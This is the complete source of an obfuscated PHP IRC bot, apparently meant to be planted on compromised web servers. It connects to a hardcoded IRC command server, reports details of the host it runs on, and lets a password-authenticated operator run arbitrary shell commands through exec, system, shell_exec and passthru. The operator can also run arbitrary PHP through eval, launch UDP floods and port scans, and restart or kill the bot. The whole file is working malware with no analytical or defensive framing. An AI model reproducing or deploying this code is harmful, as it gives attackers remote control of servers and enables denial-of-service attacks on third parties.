<?php set_time_limit(0); error_reporting(0);  class fvJBbZBvNRVZVRbVz {

 var $NVVfjbBnFrNZRBF = array("jjfnJfJVZBrrrvNr"=>"gangbang.angels-agency.nl",
                     "fFNN"=>"23232",
                     "Rnnbr"=>"scary",
                     "fnRvRv"=>"13",
                     "PpltH"=>"#wWw#",
                     "jFJ"=>"scan",
                     "nvNzJBNZF"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "FbrvzJRfJr"=>".",
                     "BRzbVbfnzbb"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $BJBFnRbFFjZfRrNzfN = array(); 
 function uUImyyYE($hTxT) 
 { 
    unset($this->BJBFnRbFFjZfRrNzfN[$hTxT]); 
 } function yqeymYUYMayMMqmym() {
  $LTDPPD = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $dhPLlpd = strlen($LTDPPD);
  for($d=0;$d<6;$d++) {
	$aAM .= $LTDPPD[rand(0,$dhPLlpd-1)];
  }
  if(php_uname() == "") { $PLpTtxDP = "---"; } else { $PLpTtxDP = php_uname(); }
  $this->UMQiymE("USER ".$aAM."-go 127.0.0.1 localhost :".$PLpTtxDP."");
 } function MmMQaiEeQUAaa() 
 { 
    if(!($this->Gsgocgkcs = fsockopen($this->NVVfjbBnFrNZRBF['jjfnJfJVZBrrrvNr'],$this->NVVfjbBnFrNZRBF['fFNN'],$e,$s,30))) 
    $this->MmMQaiEeQUAaa(); 
    $this->yqeymYUYMayMMqmym();
    if(strlen($this->NVVfjbBnFrNZRBF['Rnnbr'])>0) 
    $this->UMQiymE("PASS ".$this->NVVfjbBnFrNZRBF['Rnnbr']);
    $this->muIYIuIYYUaEIuEi();
    $this->MYAuQUiQiayiqA();
 } function AqaYYe($PpltH,$jFJ=NULL) 
 { 
    $this->UMQiymE("JOIN $PpltH $jFJ"); 
 } function UMQiymE($TPd) 
 { 
    fwrite($this->Gsgocgkcs,"$TPd\r\n"); 
 } function aYEyIIyuuQIuaaqYUYQ() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $TdHhLddDhhd = "\0034ON\003"; } else { $TdHhLddDhhd = "\0039OFF\003"; }

	$PLpTtxDP = php_uname();
	if($PLpTtxDP == "") { $bjSKpl = "\00315---\003"; } else { $bjSKpl = "\00315".$PLpTtxDP."\003"; }
		 
	 $BNOC = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $XtSSo =  getcwd()."";
	 
	 $DKKk = "\00315".$XtSSo."\003";

	$sSsgOWKcCk = fileperms("$XtSSo");

	if (($sSsgOWKcCk & 0xC000) == 0xC000) { $ScsCOskgcCS = 's';
	} elseif (($sSsgOWKcCk & 0xA000) == 0xA000) { $ScsCOskgcCS = 'l';
	} elseif (($sSsgOWKcCk & 0x8000) == 0x8000) { $ScsCOskgcCS = '-';
	} elseif (($sSsgOWKcCk & 0x6000) == 0x6000) { $ScsCOskgcCS = 'b';
	} elseif (($sSsgOWKcCk & 0x4000) == 0x4000) { $ScsCOskgcCS = 'd';
	} elseif (($sSsgOWKcCk & 0x2000) == 0x2000) { $ScsCOskgcCS = 'c';
	} elseif (($sSsgOWKcCk & 0x1000) == 0x1000) { $ScsCOskgcCS = 'p';
	} else { $ScsCOskgcCS = 'u'; }

	$ScsCOskgcCS .= (($sSsgOWKcCk & 0x0100) ? 'r' : '-');
	$ScsCOskgcCS .= (($sSsgOWKcCk & 0x0080) ? 'w' : '-');
	$ScsCOskgcCS .= (($sSsgOWKcCk & 0x0040) ?	(($sSsgOWKcCk & 0x0800) ? 's' : 'x' ) :	(($sSsgOWKcCk & 0x0800) ? 'S' : '-'));

	$ScsCOskgcCS .= (($sSsgOWKcCk & 0x0020) ? 'r' : '-');
	$ScsCOskgcCS .= (($sSsgOWKcCk & 0x0010) ? 'w' : '-');
	$ScsCOskgcCS .= (($sSsgOWKcCk & 0x0008) ?	(($sSsgOWKcCk & 0x0400) ? 's' : 'x' ) :	(($sSsgOWKcCk & 0x0400) ? 'S' : '-'));

	$ScsCOskgcCS .= (($sSsgOWKcCk & 0x0004) ? 'r' : '-');
	$ScsCOskgcCS .= (($sSsgOWKcCk & 0x0002) ? 'w' : '-');
	$ScsCOskgcCS .= (($sSsgOWKcCk & 0x0001) ?	(($sSsgOWKcCk & 0x0200) ? 't' : 'x' ) :	(($sSsgOWKcCk & 0x0200) ? 'T' : '-'));
			
	$nbpt = "\00315".$ScsCOskgcCS."\003";

	$this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"\00314[SAFE:\003\002 $TdHhLddDhhd\002\00314]\00315 $BNOC \00314[pwd:]\00315 $DKKk \00314(\003$nbpt\00314) [uname:]\00315 $bjSKpl");
 } function emUMiMuYiUU($lL,$TPd)
 {
    $this->UMQiymE("PRIVMSG $lL :$TPd");
 } function EeeIaEmYQE($lL,$TPd)
 {
    $this->UMQiymE("NOTICE $lL :$TPd");
 } function uYuQeqmyUUeQyqmQyM($hTxT,$dDtdphHTpt,$eQuu) {
	$this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"[\002UdpFlood Gestart!\002]"); 
	$xtDpHXtpd = "";
	for($d=0;$d<$dDtdphHTpt;$d++) { $xtDpHXtpd .= chr(mt_rand(1,256)); }
	$LptLH = time();
	$d = 0;
	while(time()-$LptLH < $eQuu) {
		$vH=fsockopen("udp://".$hTxT,mt_rand(0,6000),$e,$s,5);
      	fwrite($vH,$xtDpHXtpd);
       	fclose($vH);
		$d++;
	}
	$JgX = $d * $dDtdphHTpt;
	$JgX = $JgX / 1048576;
	$TZg = $JgX / $eQuu;
	$TZg = round($TZg);
	$JgX = round($JgX);
	$this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"[\002UdpFlood Afgerond!\002]: $JgX MB verzonden / gemiddelde: $TZg MB/s ");
 } function myQUiymAaEei($hTxT) 
 { 
    if(isset($this->BJBFnRbFFjZfRrNzfN[$hTxT])) 
       return 1; 
    else 
       return 0; 
 }function MYAuQUiQiayiqA() 
 { 
    while(!feof($this->Gsgocgkcs)) 
    { 
       $this->meuum = trim(fgets($this->Gsgocgkcs,512)); 
       $FRzrnJrBFvfJn = explode(" ",$this->meuum); 
       if(substr($this->meuum,0,6)=="PING :") 
       { 
          $this->UMQiymE("PONG :".substr($this->meuum,6)); 
       } 
       if(isset($FRzrnJrBFvfJn[1]) && $FRzrnJrBFvfJn[1] =="004") 
       { 
          $this->UMQiymE("JOIN ".$this->NVVfjbBnFrNZRBF['PpltH']." ".$this->NVVfjbBnFrNZRBF['jFJ']."");
          $this->AqaYYe($this->NVVfjbBnFrNZRBF['PpltH'],$this->NVVfjbBnFrNZRBF['jFJ']);
          $this->aYEyIIyuuQIuaaqYUYQ();
       } 
       if(isset($FRzrnJrBFvfJn[1]) && $FRzrnJrBFvfJn[1]=="433") 
       { 
          $this->muIYIuIYYUaEIuEi(); 
       }
       if($this->meuum != $NBz_pDH) 
       { 
          $BJvrnFJnvfrnjZ = array(); 
          $GCc = substr(strstr($this->meuum," :"),2); 
          $sGkK = explode(" ",$GCc); 
          $CsCOc = explode("!",$FRzrnJrBFvfJn[0]); 
          $wOkwSC = explode("@",$CsCOc[1]); 
          $wOkwSC = $wOkwSC[1]; 
          $CsCOc = substr($CsCOc[0],1); 
          $osGsGCC = $FRzrnJrBFvfJn[0]; 
          if($sGkK[0]==$this->CsCOc) 
          { 
           for($d=0;$d<count($sGkK);$d++) 
              $BJvrnFJnvfrnjZ[$d] = $sGkK[$d+1]; 
          } 
          else 
          { 
           for($d=0;$d<count($sGkK);$d++) 
              $BJvrnFJnvfrnjZ[$d] = $sGkK[$d]; 
          } 
          if(count($FRzrnJrBFvfJn)>2) 
          { 
             switch($FRzrnJrBFvfJn[1]) 
             { 
                case "QUIT": 
                   if($this->myQUiymAaEei($osGsGCC)) 
                   { 
                      $this->uUImyyYE($osGsGCC); 
                   } 
                break; 
                case "PART": 
                   if($this->myQUiymAaEei($osGsGCC)) 
                   { 
                      $this->uUImyyYE($osGsGCC); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->myQUiymAaEei($osGsGCC) && (md5($wOkwSC) == $this->NVVfjbBnFrNZRBF['BRzbVbfnzbb'] || $this->NVVfjbBnFrNZRBF['BRzbVbfnzbb'] == "*")) 
                   { 
                      if(substr($BJvrnFJnvfrnjZ[0],0,1)==$this->NVVfjbBnFrNZRBF['FbrvzJRfJr']) 
                      { 
                         switch(substr($BJvrnFJnvfrnjZ[0],1)) 
                         { 
                            case "user": 
                              if(md5($BJvrnFJnvfrnjZ[1])==$this->NVVfjbBnFrNZRBF['nvNzJBNZF']) 
                              { 
                                 $this->eYeiIuqEQ($osGsGCC);
                              } 
                              else 
                              { 
                                 $this->EeeIaEmYQE($this->NVVfjbBnFrNZRBF['PpltH'],"[\002Auth\002]: Fout password $CsCOc idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->myQUiymAaEei($osGsGCC)) 
                   { 
                      if(substr($BJvrnFJnvfrnjZ[0],0,1)==$this->NVVfjbBnFrNZRBF['FbrvzJRfJr']) 
                      { 
                         switch(substr($BJvrnFJnvfrnjZ[0],1)) 
                         {                            case "restart": 
                               $this->UMQiymE("QUIT :gerestart door $CsCOc");
                               fclose($this->Gsgocgkcs); 
                               $this->MmMQaiEeQUAaa(); 
                            break;                            case "exec": 
                               $OCgCCCcosgkC = substr(strstr($GCc,$BJvrnFJnvfrnjZ[0]),strlen($BJvrnFJnvfrnjZ[0])+1); 
                               $KOWcCoccOcgKK = exec($OCgCCCcosgkC); 
                               $wkSKOkwosCSscg = explode("\n",$KOWcCoccOcgKK); 
                               for($d=0;$d<count($wkSKOkwosCSscg);$d++) 
                                  if($wkSKOkwosCSscg[$d]!=NULL) 
                                     $this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"      : ".trim($wkSKOkwosCSscg[$d])); 
                            break;                            case "logout": 
                               $this->uUImyyYE($osGsGCC); 
                               $this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"[\002Auth\002]\00314 Je bent nu uitgelogt $CsCOc"); 
                            break;                            case "pscan": 
                               if(count($BJvrnFJnvfrnjZ) > 2) 
                               { 
                                  if(fsockopen($BJvrnFJnvfrnjZ[1],$BJvrnFJnvfrnjZ[2],$e,$s,15)) 
                                     $this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"[\002pscan\002]: ".$BJvrnFJnvfrnjZ[1].":".$BJvrnFJnvfrnjZ[2]." is \2open\2"); 
                                  else 
                                     $this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"[\002pscan\002]: ".$BJvrnFJnvfrnjZ[1].":".$BJvrnFJnvfrnjZ[2]." is \2closed\2"); 
                               } 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($GCc,$BJvrnFJnvfrnjZ[1]),strlen($BJvrnFJnvfrnjZ[1])));
                            break;                            case "udpflood": 
                               if(count($BJvrnFJnvfrnjZ)>3) 
                               { 
                                  $this->uYuQeqmyUUeQyqmQyM($BJvrnFJnvfrnjZ[1],$BJvrnFJnvfrnjZ[2],$BJvrnFJnvfrnjZ[3]); 
                               } 
                            break;                            case "rndnick": 
                               $this->muIYIuIYYUaEIuEi(); 
                            break;                            case "dns": 
                               if(isset($BJvrnFJnvfrnjZ[1])) 
                               { 
                                  $ok = explode(".",$BJvrnFJnvfrnjZ[1]); 
                                  if(count($ok)==4 && is_numeric($ok[0]) && is_numeric($ok[1]) && is_numeric($ok[2]) && is_numeric($ok[3])) 
                                  { 
                                     $this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"[\002dns\002]: ".$BJvrnFJnvfrnjZ[1]." => ".gethostbyaddr($BJvrnFJnvfrnjZ[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"[\002dns\002]: ".$BJvrnFJnvfrnjZ[1]." => ".gethostbyname($BJvrnFJnvfrnjZ[1])); 
                                  } 
                               } 
                            break;                            case "passthru": 
                               $OCgCCCcosgkC = substr(strstr($GCc,$BJvrnFJnvfrnjZ[0]),strlen($BJvrnFJnvfrnjZ[0])+1); 

                               $KOWcCoccOcgKK = passthru($OCgCCCcosgkC); 
                               $wkSKOkwosCSscg = explode("\n",$KOWcCoccOcgKK); 
                               for($d=0;$d<count($wkSKOkwosCSscg);$d++) 
                                  if($wkSKOkwosCSscg[$d]!=NULL) 
                                     $this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"      : ".trim($wkSKOkwosCSscg[$d])); 
                            break;                            case "raw":
                               $this->UMQiymE(strstr($GCc,$BJvrnFJnvfrnjZ[1])); 
                            break;                            case "sexec":
                               $OCgCCCcosgkC = substr(strstr($GCc,$BJvrnFJnvfrnjZ[0]),strlen($BJvrnFJnvfrnjZ[0])+1); 
                               $KOWcCoccOcgKK = shell_exec($OCgCCCcosgkC); 
                               $wkSKOkwosCSscg = explode("\n",$KOWcCoccOcgKK); 
                               for($d=0;$d<count($wkSKOkwosCSscg);$d++) 
                                  if($wkSKOkwosCSscg[$d]!=NULL) 
                                     $this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"      : ".trim($wkSKOkwosCSscg[$d])); 
                            break;                            case "info":
                               $this->aYEyIIyuuQIuaaqYUYQ();
                            break;                            case "system": 
                               $OCgCCCcosgkC = substr(strstr($GCc,$BJvrnFJnvfrnjZ[0]),strlen($BJvrnFJnvfrnjZ[0])+1); 
                               $KOWcCoccOcgKK = system($OCgCCCcosgkC); 
                               $wkSKOkwosCSscg = explode("\n",$KOWcCoccOcgKK); 
                               for($d=0;$d<count($wkSKOkwosCSscg);$d++) 
                                  if($wkSKOkwosCSscg[$d]!=NULL) 
                                     $this->emUMiMuYiUU($this->NVVfjbBnFrNZRBF['PpltH'],"      : ".trim($wkSKOkwosCSscg[$d])); 
                            break;                            case "die": 
                               $this->UMQiymE("QUIT :die command from $CsCOc");
                               fclose($this->Gsgocgkcs); 
                               exit;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $NBz_pDH = $this->meuum; 
    } 
    $this->MmMQaiEeQUAaa(); 
 } function muIYIuIYYUaEIuEi() {
  $LTDPPD = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $dhPLlpd = strlen($LTDPPD);
  for($d=0;$d<$this->NVVfjbBnFrNZRBF['fnRvRv'];$d++) {
	$aAM .= $LTDPPD[rand(0,$dhPLlpd-1)];
  }
  $this->UMQiymE("NICK ".$aAM."");
 } function eYeiIuqEQ($hTxT) 
 { 
    $this->BJBFnRbFFjZfRrNzfN[$hTxT] = true; 
 }}
$ssOSwCwC = new fvJBbZBvNRVZVRbVz;
$ssOSwCwC->MmMQaiEeQUAaa(); ?>